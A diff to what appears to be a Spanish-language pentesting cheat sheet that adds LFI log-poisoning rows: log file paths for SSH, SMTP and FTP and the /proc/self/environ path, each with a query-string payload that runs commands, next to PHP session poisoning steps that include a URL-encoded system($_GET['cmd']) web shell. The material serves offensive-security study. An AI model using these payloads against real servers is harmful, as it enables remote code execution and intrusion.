@@ -55,10 +55,13 @@
 | --- | --- | --- |
 | `/var/log/apache2/access.log` | `?filename=/var/log/apache2/access.log&cmd=[Comando]` | Ruta Logs de Apache |
 | `/var/log/nginx/access.log` | `?filename=/var/log/nginx/access.log&cmd=[Comando]` | Ruta Logs de Nginx |
+| `/var/log/btmp` \| `/var/log/auth.log` \| `/var/log/sshd.log` | `?filename=/var/log/btmp&cmd=[Comando]` | Ruta Logs de `SSH` |
+| `/var/log/mail` | `?filename=/var/log/mail&cmd=[Comando]` | Ruta Logs de `SMTP` |
+| `/var/log/vsftpd.log` | `?filename=/var/log/vsftpd.log&cmd=[Comando]` | Ruta Logs de `FTP` |
+| `/proc/self/environ` \| `/proc/self/fd/N` | `?filename=/proc/self/environ&cmd=[Comando]` | Rutas en las que se refleja `User-Agent` |
 | 1. Paso `/var/lib/php/sessions/` | `?language=/var/lib/php/sessions/sess_<PHPSESSID>` | PHP Session Poisoning |
 | 2. Paso `/var/lib/php/sessions/` | `?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E` | Incluyendo `<?php system($_GET['cmd']); ?>` |
 | 3. Paso `/var/lib/php/sessions/` | `/var/lib/php/sessions/sess_<PHPSESSID>&cmd=[Comando]` | Ejecutar comando |
-
 
 
 ## Automatizando con `ffuf` 🐶
